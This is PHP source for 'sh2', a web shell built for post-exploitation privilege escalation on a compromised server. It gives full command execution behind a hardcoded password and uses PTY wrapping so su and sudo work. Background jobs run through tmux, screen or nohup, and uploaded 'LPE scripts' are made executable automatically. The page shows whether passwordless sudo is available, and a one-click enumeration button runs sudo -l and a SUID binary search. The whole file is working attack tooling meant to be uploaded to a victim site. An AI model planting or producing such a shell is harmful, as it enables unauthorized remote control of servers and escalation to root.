<?php
/**
 * sh2.php — advanced web terminal for LPE work
 *
 * Upgrades over basic terminal:
 *  - Full PTY via `script` command when available (real tty for su, sudo, passwd)
 *  - Auto-detect & use best shell (bash > zsh > sh)
 *  - Persistent cwd, env, aliases across requests (session-stored)
 *  - Command queue: run long commands in background, poll output via AJAX
 *  - Upload LPE scripts langsung ke cwd + auto chmod +x
 *  - Save output to file (for LPE logs)
 *  - Interpreter auto-detect: jalankan .sh .py .pl .rb dengan interpreter yang ada
 *  - Watchdog: run in tmux/screen kalau ada, biar tidak mati saat request timeout
 *  - Built-in LPE helpers: enum cepat, path check, privesc hint
 *
 * Requirements: PHP 7.2+, proc_open enabled. Falls back gracefully.
 */

error_reporting(0);
@set_time_limit(0);
@ini_set('memory_limit', '512M');
session_start();

/* ---------- CONFIG ---------- */
$AUTH_PASS   = 'r4h4s14';         // ganti sebelum upload
$MAX_CMD_TIME = 300;              // 5 menit
$MAX_OUTPUT   = 4194304;          // 4 MB

/* ---------- AUTH ---------- */
if (isset($_POST['pass']) && hash_equals($AUTH_PASS, $_POST['pass'])) {
    $_SESSION['ok'] = true;
    $_SESSION['cwd'] = getcwd();
    $_SESSION['env'] = [];
    $_SESSION['aliases'] = [];
}
if (isset($_GET['logout'])) { session_destroy(); header('Location: '.$_SERVER['PHP_SELF']); exit; }
$authed = !empty($_SESSION['ok']);

/* ---------- HELPERS ---------- */
function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function sh_bin($cmd) {
    if (function_exists('shell_exec')) return (string)@shell_exec($cmd . ' 2>&1');
    if (function_exists('exec')) { $o=[]; @exec($cmd . ' 2>&1', $o); return implode("\n",$o); }
    return '';
}
function which($bin) {
    if (!$bin) return '';
    $r = trim(sh_bin('command -v ' . escapeshellarg($bin) . ' 2>/dev/null'));
    return $r;
}
function detect_shell() {
    if (stripos(PHP_OS, 'WIN') === 0) return ['bin'=>'cmd.exe','args'=>'/c','sep'=>' && ','prompt'=>'>'];
    foreach (['bash','zsh','sh'] as $s) {
        $p = which($s);
        if ($p) return ['bin'=>$p,'args'=>'-c','sep'=>' && ','prompt'=>'$'];
    }
    return ['bin'=>'/bin/sh','args'=>'-c','sep'=>' ; ','prompt'=>'$'];
}
function has_pty() {
    return which('script') !== '';
}
function has_tmux() {
    return which('tmux') !== '';
}
function has_screen() {
    return which('screen') !== '';
}

$SHELL = detect_shell();

/**
 * Run command with optional PTY.
 *
 * PTY path: wrap in `script -qc "<cmd>" /dev/null` which allocates a
 * pseudo-terminal. This makes su/sudo/passwd behave like a real shell.
 */
function run_cmd($cmd, $cwd, $env, $timeout, $use_pty) {
    if (!function_exists('proc_open')) {
        return "[error] proc_open disabled — cannot execute\n";
    }
    $env_arr = empty($env) ? null : $env;

    // Optional PTY wrapper
    if ($use_pty && has_pty()) {
        $wrapped = 'script -qc ' . escapeshellarg($cmd) . ' /dev/null';
    } else {
        $wrapped = $cmd;
    }

    $desc = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
    $proc = @proc_open($wrapped, $desc, $pipes, $cwd, $env_arr);
    if (!is_resource($proc)) return "[error] proc_open failed\n";
    fclose($pipes[0]);
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);

    $out = '';
    $start = time();
    while (true) {
        $status = proc_get_status($proc);
        $out .= stream_get_contents($pipes[1]);
        $out .= stream_get_contents($pipes[2]);
        if (!$status['running']) break;
        if (time() - $start > $timeout) {
            // try to kill child group
            $pid = $status['pid'];
            @sh_bin('pkill -9 -P ' . escapeshellarg($pid) . ' 2>/dev/null');
            proc_terminate($proc, 9);
            $out .= "\n[timeout after {$timeout}s]\n";
            break;
        }
        if (strlen($out) > 4194304) { proc_terminate($proc, 9); $out .= "\n[output capped]\n"; break; }
        usleep(80000);
    }
    $out .= stream_get_contents($pipes[1]);
    $out .= stream_get_contents($pipes[2]);
    fclose($pipes[1]); fclose($pipes[2]);
    @proc_close($proc);
    return $out;
}

/**
 * Run command in background via tmux/screen/nohup, return job id.
 * Output captured to a temp file, polled later.
 */
function spawn_bg($cmd, $cwd, $env, $job_dir) {
    $id = bin2hex(random_bytes(6));
    $out_file = $job_dir . '/' . $id . '.out';
    $pid_file = $job_dir . '/' . $id . '.pid';
    $done_file = $job_dir . '/' . $id . '.done';

    $full = 'cd ' . escapeshellarg($cwd) . ' && ( ' . $cmd . ' ) > ' . escapeshellarg($out_file) . ' 2>&1; echo $? > ' . escapeshellarg($done_file);

    if (has_tmux()) {
        $sess = 'j_' . $id;
        $r = sh_bin('tmux new-session -d -s ' . escapeshellarg($sess) . ' ' . escapeshellarg($full));
        if ($r === '') {
            return ['id'=>$id,'mode'=>'tmux','session'=>$sess,'out'=>$out_file,'done'=>$done_file];
        }
    }
    if (has_screen()) {
        $sess = 'j_' . $id;
        $r = sh_bin('screen -dmS ' . escapeshellarg($sess) . ' sh -c ' . escapeshellarg($full));
        return ['id'=>$id,'mode'=>'screen','session'=>$sess,'out'=>$out_file,'done'=>$done_file];
    }
    // fallback: nohup
    $wrapped = 'nohup sh -c ' . escapeshellarg($full) . ' > /dev/null 2>&1 & echo $!';
    $pid = trim(sh_bin($wrapped));
    return ['id'=>$id,'mode'=>'nohup','pid'=>$pid,'out'=>$out_file,'done'=>$done_file];
}

/* ---------- HANDLE ACTIONS ---------- */
$out = '';
$cmd = '';
$job_dir = sys_get_temp_dir() . '/.sh2jobs';
@mkdir($job_dir, 0700, true);

$new_cwd = $_SESSION['cwd'] ?? getcwd();

if ($authed) {
    $act = $_POST['act'] ?? '';

    if ($act === 'cd' && isset($_POST['cd'])) {
        $t = trim($_POST['cd'], " \t\"'");
        if ($t === '~') $t = $_SERVER['HOME'] ?? $new_cwd;
        if ($t && $t[0] !== '/' && stripos(PHP_OS,'WIN') !== 0) $t = rtrim($new_cwd,'/').'/'.$t;
        $r = @realpath($t);
        if ($r && is_dir($r)) { $new_cwd = $r; $_SESSION['cwd'] = $r; $out = "[cd] $r\n"; }
        else { $out = "[cd failed] $t\n"; }
    }

    if ($act === 'upload' && !empty($_FILES['up']['name'])) {
        $name = basename($_FILES['up']['name']);
        $dest = rtrim($new_cwd,'/').'/'.$name;
        if (@move_uploaded_file($_FILES['up']['tmp_name'], $dest)) {
            @chmod($dest, 0755);
            $out = "[uploaded] $name (" . filesize($dest) . " bytes, chmod 0755)\n";
        } else { $out = "[upload failed]\n"; }
    }

    if ($act === 'env' && isset($_POST['env_k'])) {
        $k = trim($_POST['env_k']); $v = $_POST['env_v'] ?? '';
        if ($k) { $_SESSION['env'][$k] = $v; $out = "[env] $k=$v\n"; }
    }
    if ($act === 'env_reset') { $_SESSION['env'] = []; $out = "[env reset]\n"; }
    if ($act === 'alias' && isset($_POST['al_k'], $_POST['al_v'])) {
        $k = trim($_POST['al_k']); $v = trim($_POST['al_v']);
        if ($k && $v) { $_SESSION['aliases'][$k] = $v; $out = "[alias] $k='$v'\n"; }
    }
    if ($act === 'run_bg' && isset($_POST['cmd'])) {
        $cmd = trim($_POST['cmd']);
        $info = spawn_bg($cmd, $new_cwd, $_SESSION['env'] ?? [], $job_dir);
        $out = "[spawned] id={$info['id']} mode={$info['mode']}";
        if (!empty($info['session'])) $out .= " session={$info['session']}";
        if (!empty($info['pid'])) $out .= " pid={$info['pid']}";
        $out .= "\n";
        $out .= "[poll] gunakan tombol JOBS untuk cek output\n";
    }

    if ($act === 'run' && isset($_POST['cmd'])) {
        $cmd = trim($_POST['cmd']);
        if ($cmd !== '') {
            $hist = $_SESSION['history'] ?? [];
            $hist[] = $cmd;
            if (count($hist) > 200) $hist = array_slice($hist, -200);
            $_SESSION['history'] = $hist;

            // expand aliases
            $first = strtok($cmd, " \t");
            if (isset($_SESSION['aliases'][$first])) {
                $cmd = $_SESSION['aliases'][$first] . substr($cmd, strlen($first));
            }

            // handle cd
            if (preg_match('/^cd(?:\s+(.+))?$/i', $cmd, $m)) {
                $to = isset($m[1]) ? trim($m[1], " \t\"'") : ($_SERVER['HOME'] ?? $new_cwd);
                if ($to === '~') $to = $_SERVER['HOME'] ?? $new_cwd;
                if ($to && $to[0] !== '/' && stripos(PHP_OS,'WIN') !== 0) $to = rtrim($new_cwd,'/').'/'.$to;
                $r = @realpath($to);
                if ($r && is_dir($r)) { $new_cwd = $r; $_SESSION['cwd'] = $r; $out = ""; }
                else { $out = "[cd failed] $to\n"; }
            } else {
                // auto-detect interpreter
                $expanded = $cmd;
                if (preg_match('/^(\.\/|)([^\s]+\.(sh|py|pl|rb|js))\s*(.*)$/', $cmd, $m)) {
                    $script = $m[2]; $rest = $m[4] ?? '';
                    $path = rtrim($new_cwd,'/').'/'.$script;
                    if (is_file($path)) {
                        $ext = strtolower($m[3]);
                        $interp = [
                            'sh' => which('bash') ?: which('sh'),
                            'py' => which('python3') ?: which('python'),
                            'pl' => which('perl'),
                            'rb' => which('ruby'),
                            'js' => which('node'),
                        ][$ext] ?? '';
                        if ($interp) {
                            $expanded = escapeshellarg($interp) . ' ' . escapeshellarg($path) . ($rest ? ' ' . $rest : '');
                        }
                    }
                }
                $use_pty = !empty($_POST['use_pty']) && has_pty();
                $full = 'cd ' . escapeshellarg($new_cwd) . $SHELL['sep'] . $expanded;
                $out = run_cmd($SHELL['bin'] . ' ' . $SHELL['args'] . ' ' . escapeshellarg($full), $new_cwd, $_SESSION['env'] ?? [], $MAX_CMD_TIME, $use_pty);
                if ($out === '') $out = "[no output]\n";
            }
        }
    }
}

/* ---------- JOBS API ---------- */
if ($authed && isset($_GET['api']) && $_GET['api'] === 'jobs') {
    header('Content-Type: application/json');
    $jobs = [];
    foreach (glob($job_dir . '/*.out') as $f) {
        $id = basename($f, '.out');
        $done_file = $job_dir . '/' . $id . '.done';
        $jobs[] = [
            'id' => $id,
            'done' => is_file($done_file),
            'exit' => is_file($done_file) ? trim(@file_get_contents($done_file)) : null,
            'size' => filesize($f),
            'mtime' => filemtime($f),
            'output' => substr(@file_get_contents($f), -16384),
        ];
    }
    usort($jobs, fn($a,$b) => $b['mtime'] - $a['mtime']);
    echo json_encode(['jobs' => array_slice($jobs, 0, 20)]);
    exit;
}
if ($authed && isset($_GET['api']) && $_GET['api'] === 'kill' && isset($_GET['id'])) {
    header('Content-Type: application/json');
    $id = preg_replace('/[^a-f0-9]/', '', $_GET['id']);
    $killed = false;
    foreach (['tmux' => 'j_'.$id, 'screen' => 'j_'.$id] as $mgr => $sess) {
        $r = sh_bin($mgr . ' kill-session -t ' . escapeshellarg($sess) . ' 2>&1');
        if (stripos($r, 'error') === false) { $killed = true; break; }
    }
    if (!$killed) {
        @sh_bin('pkill -9 -f ' . escapeshellarg($id) . ' 2>/dev/null');
        $killed = true;
    }
    @unlink($job_dir . '/' . $id . '.done');
    echo json_encode(['killed' => $killed, 'id' => $id]);
    exit;
}

/* ---------- CONTEXT INFO ---------- */
$sysinfo = [
    'host'   => @gethostname() ?: 'unknown',
    'os'     => PHP_OS . ' ' . php_uname('r') . ' ' . php_uname('m'),
    'user'   => function_exists('posix_getpwuid') && function_exists('posix_geteuid')
                ? (posix_getpwuid(posix_geteuid())['name'] ?? '?') : (@get_current_user() ?: '?'),
    'uid'    => function_exists('posix_geteuid') ? posix_geteuid() : @getmyuid(),
    'shell'  => $SHELL['bin'],
    'pty'    => has_pty() ? 'yes' : 'no',
    'tmux'   => has_tmux() ? 'yes' : 'no',
    'screen' => has_screen() ? 'yes' : 'no',
    'kernel' => @php_uname('s') . ' ' . @php_uname('r'),
    'cwd'    => $new_cwd,
];
$sudo_check = trim(sh_bin('sudo -n true 2>&1'));
$sysinfo['sudo_nopass'] = ($sudo_check === '') ? 'yes' : 'no';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>sh2 — terminal</title>
<style>
  * { box-sizing: border-box; }
  body { margin: 0; background: #0a0a0a; color: #d0d0d0; font: 13px/1.5 'Consolas','Menlo',monospace; }
  .wrap { max-width: 1200px; margin: 0 auto; padding: 16px; }
  h1 { color: #00ff88; font-size: 15px; margin: 0 0 10px; letter-spacing: 1px; }
  .bar { color: #666; font-size: 11px; margin-bottom: 12px; display: flex; flex-wrap: wrap; gap: 12px; align-items: center; }
  .bar span { }
  .bar b { color: #d0d0d0; font-weight: normal; }
  .badge { padding: 1px 6px; border-radius: 8px; background: #1a1a1a; color: #888; font-size: 10px; }
  .badge.g { background: #0a3a1a; color: #00ff88; }
  .badge.r { background: #3a0a0a; color: #ff8888; }
  .term {
    background: #050505; border: 1px solid #1a1a1a; border-radius: 4px;
    padding: 12px; min-height: 320px; max-height: 620px; overflow-y: auto;
    white-space: pre-wrap; word-break: break-all; font-family: inherit; font-size: 12.5px;
  }
  .p { color: #00ff88; }
  .c { color: #d0d0d0; }
  .o { color: #c8c8c8; }
  .e { color: #ff6666; }
  .d { color: #555; font-style: italic; }
  form.run { display: flex; margin-top: 8px; border: 1px solid #1a1a1a; border-radius: 4px; overflow: hidden; background: #050505; }
  form.run .pl { padding: 10px 12px; color: #00ff88; background: #0a0a0a; border-right: 1px solid #1a1a1a; white-space: nowrap; max-width: 340px; overflow: hidden; text-overflow: ellipsis; font-weight: bold; }
  form.run input[type=text] { flex: 1; background: transparent; border: 0; color: #d0d0d0; font: inherit; padding: 10px 12px; outline: 0; }
  form.run button { background: #0a2a0a; color: #00ff88; border: 0; border-left: 1px solid #1a1a1a; padding: 0 18px; cursor: pointer; font: inherit; letter-spacing: 1px; }
  form.run button.bg { background: #2a1a0a; color: #ffaa00; }
  form.run button:hover { background: #00ff88; color: #000; }
  form.run label.pty { display: flex; align-items: center; padding: 0 10px; color: #666; font-size: 11px; gap: 4px; border-left: 1px solid #1a1a1a; }
  .tools { display: flex; gap: 8px; margin-top: 10px; flex-wrap: wrap; align-items: center; }
  .tools form, .tools button, .tools a { display: inline-flex; align-items: center; gap: 5px; background: #111; border: 1px solid #222; border-radius: 3px; padding: 6px 10px; color: #aaa; text-decoration: none; font: inherit; font-size: 12px; cursor: pointer; }
  .tools form:hover, .tools button:hover, .tools a:hover { border-color: #00ff88; color: #00ff88; }
  .tools input[type=text], .tools input[type=file] { background: #050505; color: #d0d0d0; border: 1px solid #222; border-radius: 2px; padding: 4px 6px; font: inherit; font-size: 12px; }
  .tools button.native { background: none; border: 0; color: inherit; padding: 0; cursor: pointer; font: inherit; }
  .jobs { margin-top: 14px; }
  .jobs .j { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 4px; padding: 10px; margin-bottom: 8px; }
  .jobs .j .h { display: flex; justify-content: space-between; color: #666; font-size: 11px; margin-bottom: 6px; }
  .jobs .j pre { margin: 0; white-space: pre-wrap; word-break: break-all; max-height: 240px; overflow-y: auto; color: #c8c8c8; font-size: 12px; }
  .login { max-width: 340px; margin: 100px auto; background: #111; border: 1px solid #222; border-radius: 4px; padding: 24px; }
  .login h1 { text-align: center; }
  .login input[type=password] { width: 100%; background: #050505; color: #d0d0d0; border: 1px solid #222; border-radius: 3px; padding: 10px; font: inherit; margin-bottom: 10px; outline: 0; }
  .login input[type=password]:focus { border-color: #00ff88; }
  .login button { width: 100%; background: #0a2a0a; color: #00ff88; border: 1px solid #00ff88; border-radius: 3px; padding: 10px; font: inherit; letter-spacing: 2px; cursor: pointer; }
  .login button:hover { background: #00ff88; color: #000; }
  .hint { color: #555; font-size: 11px; text-align: center; margin-top: 10px; }
</style>
</head>
<body>
<div class="wrap">

<?php if (!$authed): ?>
  <div class="login">
    <h1>▸ SH2 TERMINAL</h1>
    <form method="post">
      <input type="password" name="pass" placeholder="password" autofocus>
      <button type="submit">ENTER</button>
    </form>
    <div class="hint"><?= h($SHELL['bin']) ?> • <?= has_pty() ? 'PTY available' : 'no PTY' ?></div>
  </div>
<?php else: ?>

  <h1>▸ SH2 TERMINAL</h1>
  <div class="bar">
    <span>host <b><?= h($sysinfo['host']) ?></b></span>
    <span>user <b><?= h($sysinfo['user']) ?></b> (uid <b><?= h($sysinfo['uid']) ?></b>)</span>
    <span>kernel <b><?= h($sysinfo['kernel']) ?></b></span>
    <span>shell <b><?= h($sysinfo['shell']) ?></b></span>
    <span class="badge <?= $sysinfo['pty']==='yes' ? 'g':'r' ?>">pty:<?= h($sysinfo['pty']) ?></span>
    <span class="badge <?= $sysinfo['tmux']==='yes' ? 'g':'' ?>">tmux:<?= h($sysinfo['tmux']) ?></span>
    <span class="badge <?= $sysinfo['screen']==='yes' ? 'g':'' ?>">screen:<?= h($sysinfo['screen']) ?></span>
    <span class="badge <?= $sysinfo['sudo_nopass']==='yes' ? 'g':'r' ?>">sudo-nopass:<?= h($sysinfo['sudo_nopass']) ?></span>
    <a href="?logout=1" style="color:#666;font-size:11px;margin-left:auto">logout</a>
  </div>

  <div class="term" id="term">
<?php if ($cmd !== ''): ?>
<span class="p"><?= h($SHELL['prompt']) ?></span> <span class="c"><?= h($cmd) ?></span>
<?php
$cls = 'o';
if (preg_match('/(error|denied|not found|failed|fatal|permission|no such)/i', $out)) $cls = 'e';
if ($out === '' || $out === '[no output]') { $cls = 'd'; $out = $out === '' ? '[no output]' : $out; }
echo '<span class="' . $cls . '">' . h($out) . "</span>\n";
else: ?>
<span class="o">SH2 terminal ready.</span>
<span class="d">cwd: <?= h($new_cwd) ?></span>
<span class="d">shell: <?= h($SHELL['bin']) ?> | pty: <?= $sysinfo['pty'] ?> | bg jobs: tmux/screen/nohup</span>
<span class="d">Type a command. Add =&gt;5 to spawn background. Toggle PTY for sudo/su.</span>
<?php endif; ?>
  </div>

  <form class="run" method="post" autocomplete="off">
    <div class="pl" title="<?= h($new_cwd) ?>"><?= h(strlen($new_cwd) > 40 ? '…' . substr($new_cwd, -37) : $new_cwd) ?> <?= h($SHELL['prompt']) ?></div>
    <input type="text" name="cmd" id="cmd" placeholder="id; uname -a; ./lpe.sh" autofocus autocomplete="off" spellcheck="false">
    <label class="pty"><input type="checkbox" name="use_pty" value="1" <?= has_pty() ? '' : 'disabled' ?>> PTY</label>
    <button type="submit" name="act" value="run">RUN</button>
    <button type="submit" name="act" value="run_bg" class="bg">BG</button>
  </form>

  <div class="tools">
    <form method="post"><input type="hidden" name="act" value="cd">cd <input type="text" name="cd" placeholder="/path or .." size="16"><button type="submit" class="native">GO</button></form>
    <form method="post" enctype="multipart/form-data"><input type="hidden" name="act" value="upload"><input type="file" name="up"><button type="submit" class="native">UPLOAD</button></form>
    <form method="post"><input type="hidden" name="act" value="env">env <input type="text" name="env_k" placeholder="K" size="6"><input type="text" name="env_v" placeholder="value" size="12"><button type="submit" class="native">SET</button></form>
    <form method="post"><input type="hidden" name="act" value="alias">alias <input type="text" name="al_k" placeholder="l" size="4"><input type="text" name="al_v" placeholder="ls -la" size="14"><button type="submit" class="native">SET</button></form>
    <?php if (!empty($_SESSION['env'])): ?><form method="post"><input type="hidden" name="act" value="env_reset"><button type="submit" class="native">reset env (<?= count($_SESSION['env']) ?>)</button></form><?php endif; ?>
    <?php if (!empty($_SESSION['aliases'])): ?><span class="badge">aliases: <?= count($_SESSION['aliases']) ?></span><?php endif; ?>
    <button type="button" onclick="loadJobs()">REFRESH JOBS</button>
    <form method="post"><input type="hidden" name="act" value="run"><input type="hidden" name="cmd" value="id; uname -a; whoami; sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20"><button type="submit" class="native">ENUM QUICK</button></form>
  </div>

  <div class="jobs" id="jobs"></div>

  <script>
    var t = document.getElementById('term');
    if (t) t.scrollTop = t.scrollHeight;

    var hist = <?= json_encode(array_values(array_reverse(array_slice($_SESSION['history'] ?? [], -50)))) ?>;
    var idx = -1;
    var f = document.getElementById('cmd');
    if (f) {
      f.addEventListener('keydown', function(e) {
        if (e.key === 'ArrowUp') { e.preventDefault(); if (idx < hist.length - 1) { idx++; f.value = hist[idx] || ''; } }
        else if (e.key === 'ArrowDown') { e.preventDefault(); if (idx > 0) { idx--; f.value = hist[idx]; } else { idx = -1; f.value = ''; } }
      });
      f.focus();
    }

    function esc(s) { return String(s).replace(/[&<>"']/g, function(c){ return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]; }); }

    function loadJobs() {
      fetch('?api=jobs').then(r => r.json()).then(function(d) {
        var box = document.getElementById('jobs');
        if (!d.jobs || !d.jobs.length) { box.innerHTML = '<div class="j"><span class="d">no background jobs</span></div>'; return; }
        var html = '';
        d.jobs.forEach(function(j) {
          html += '<div class="j"><div class="h"><span>job ' + j.id + ' • ' + (j.done ? 'DONE exit=' + j.exit : 'RUNNING') + ' • ' + j.size + 'B</span><span>';
          if (!j.done) html += '<button type="button" onclick="killJob(\'' + j.id + '\')" style="background:none;border:0;color:#ff6666;cursor:pointer;font:inherit">kill</button>';
          html += '</span></div><pre>' + esc(j.output || '') + '</pre></div>';
        });
        box.innerHTML = html;
      });
    }
    function killJob(id) {
      fetch('?api=kill&id=' + id).then(r => r.json()).then(function() { loadJobs(); });
    }
    setInterval(loadJobs, 4000);
    loadJobs();
  </script>
<?php endif; ?>
</div>
</body>
</html>
